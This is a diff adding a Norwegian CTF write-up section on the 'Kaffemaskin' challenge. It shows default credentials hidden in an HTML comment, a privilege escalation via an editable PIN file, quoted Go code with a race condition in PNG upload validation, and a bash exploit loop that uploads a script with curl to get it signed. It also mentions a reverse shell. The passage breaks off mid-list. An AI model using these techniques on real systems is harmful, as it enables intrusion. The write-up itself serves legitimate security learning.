@@ -289,3 +289,110 @@ Enkelt brukergrensesnitt der man kan sende inn tekst, og man får tilbake tilsyn
 Etter litt manuell testing så jeg at det dukket opp engelske ord, så da sendte jeg inn 466 000 engelske ord (https://raw.githubusercontent.com/dwyl/english-words/refs/heads/master/words.txt).
 Denne mengden ord gjorde at når jeg skrev "flag", var den tidligere uleselige teksten oversatt til engelsk og jeg kunne lese at man måtte skrive "open sesame".
 Da kom den enda mer uleselig tekst som ikke var oversatt, men man kunne tydelig se hvor flagget var plassert. Alle sifrene i flagget var leselig, så da var det bare å manuelt mappe opp resten av det hexadecimale alfabetet for å få flagget.
+
+<br>
+<br>
+
+## 2.19 Kaffemaskin
+Oppgavetekst:
+````md
+# Kaffemaskin
+
+En av kaffemaskinene til GooodGames er tilgjengelig over internett.
+
+Se om du klarer å få tilgang til denne.
+
+Kjør denne fra corax, og åpne URLen i nettleseren din:
+
+```sh
+echo "https://$USERID-coffee-machine.ctf.cybertalent.no"
+```
+````
+
+Dette var den gøyeste oppgaven!
+Denne oppgaven besto av flere steg:
+* 2.19.1 Kaffemaskin
+* 2.19.2 Kaffemaskin ROOT
+* 2.19.3 Kaffemaskin SERVER
+
+<br>
+
+### 2.19.1 Kaffemaskin
+Første som møter oss er en innloggingsside. Jeg prøver admin:admin, admin:password og noen få andre kombinasjoner før jeg setter i gang med hydra (verktøy for å brute force innloggingssider). Jeg prøve å finne ut av syntaksen til hydra, og ser på HTML-kildekoden for å finne ut hva som må være med. Pluteselig ser jeg kommentaren `<!-- default credentials: admin:coffee -->`, så da var vi inne.
+
+Når vi er logget inn har vi mulighet til å lage kaffe, laste opp bakgrunnbilde og se og endre på filer. Én fil er særlig interessant: "admin_pin.json". Brukergrensesnittet viser også (hvis man aktivt scroller ned) en "Admin"-knapp. Her må man skrive inn "Password". Jeg prøver det som allerede står i "admin_pin.json" for å unngå unødvendig endringer, men får beskjed om at det kun er lov med tall i passordet. Jeg endrer da pinkoden i "admin_pin.json" slik at den ikke inneholder bokstaver.
+
+Eleverer rettigheter, og vi får tilgang på nye funksjoner:
+- Vi får nå mulighet til å laste ned kildekoden
+- Starte et service-script
+- Se og endre på flere filer
+
+Jeg tenker med en gang at service-scriptet er garantert veien inn. Vi kan også endre på hosts-filen, enda et hint om at service-script er veien å gå. Så da er det bare å endre IP-en i hosts-filen slik at `maintenance-server.utlandia` fører til min egen corax, hvor jeg kan serve et ondsinnet service-script.
+Men, i følge kildekoden forventer server at service-script er signert med en privat nøkkel. Denne nøkkelen er det kun server som har. Jeg prøvde å se om det var en path traversal for å kunne lese denne nøkkelen, men det fant jeg ikke.
+
+Etter en stund så jeg pluteselig mulighet for å utnytte en `race condition`. Jeg så at assets ble signert med samme private nøkkel når de ble lastet ned. Assets inkluderte også bakgrunnsbilder. Dette betydde at jeg kunne laste opp et ondsinnet service-script som bakgrunn og se hvilken signatur server ga scriptet når jeg hentet "bildet" igjen. 
+Koden inneholder et forsøk på å hindre brukere å laste opp andre filer enn PNG, og den klarer jo det på et vis. Men fordi TMP-filen lagres på disk før den sjekker om det faktisk er en PNG (linje 5->linje 23), så kan jeg laste opp et shell-script, laste ned `background_tmp.png` og lese signaturen før TMP-filen blir fjernet (linje 15).
+```go
+...
+1        dstDir := filepath.Join(app.RootPath, "assets", "public", "images", "backgrounds")
+2        tmpPath := filepath.Join(dstDir, "background_tmp.png")
+3        finalPath := filepath.Join(dstDir, "background.png")
+4    
+5        if err := writeFileWithMaxSize(tmpPath, bg, maxSize); err != nil {
+6        return fmt.Errorf("failed to write tmp background: %w", err)
+7        }
+8        f, err := os.Open(tmpPath)
+9	    if err != nil {
+10	    	return fmt.Errorf("failed to open file: %w", err)
+11	    }
+12	    defer f.Close()
+13
+14	    if _, err := png.Decode(f); err != nil {
+15	    	_ = os.Remove(tmpPath)
+16	    	return fmt.Errorf("background is not a png %w", err)
+17	    }
+...
+
+18     func writeFileWithMaxSize(absPath string, src io.Reader, maxSize int) error {
+19	    if maxSize <= 0 {
+20		    return fmt.Errorf("maxSize must be > 0")
+21	    }
+22
+23	    dst, err := os.Create(absPath)
+24	    if err != nil {
+25		    return fmt.Errorf("create %q: %w", absPath, err)
+26	    }
+```
+For at jeg lettere skal kunne vinne kappløpet mot serveren, lager jeg et shell-script (`adhoc_service.sh`) som er tett opp mot 2MB (det meste er bare kommentarer). På corax kjører jeg et bash-script som ser slik ut:
+```sh
+#!/bin/bash
+
+FILE="/home/login/storage/oppdrag/2.19/www/server.py"
+PYTHON_SCRIPT="rc.py"
+
+initial_hash=$(md5sum "$FILE")
+
+# Start python script in background
+python3 "$PYTHON_SCRIPT" & 1>/dev/null
+echo "[*] Exploit started..."
+# Loop until file modification time changes
+while true; do
+    current_hash=$(md5sum "$FILE")
+    curl -F "background=@adhoc_service.sh" https://4c25b618d748efe3bf7ee12750c5f218-coffee-machine.ctf.cybertalent.no/config/background -b "session=c1e8a81737e74561d7f66f6fc92f6943"
+
+    if [[ "$current_hash" != "$initial_hash" ]]; then
+        echo "File has been edited."
+        cp /home/login/storage/oppdrag/2.19/scripts/adhoc_service.sh /home/login/storage/oppdrag/2.19/www/service/adhoc_service.sh
+        break
+    fi
+
+done
+
+echo "Done."
+```
+rc.py er et Python-script som prøver kontinuerlig å laste ned `background_tmp.png`. Når den klarer å laste det ned, noterer den verdien til `X_SIGNATURE` og sender den inn til server.py. server.py er et Python-script som legger på riktig signatur i headeren når `adhoc_service.sh` hentes. Dette scriptet inneholder kommandoer som starter et reverse shell tilbake til corax.
+
+Scriptet ovenfor kjøres altså i en uendelig loop til vi har fått riktig signatur:
+1. Starter script som kontinuerlig prøver å laste ned `background_tmp.png` (i realiteten `adhoc_service.sh`) med tilhørende 
+
+
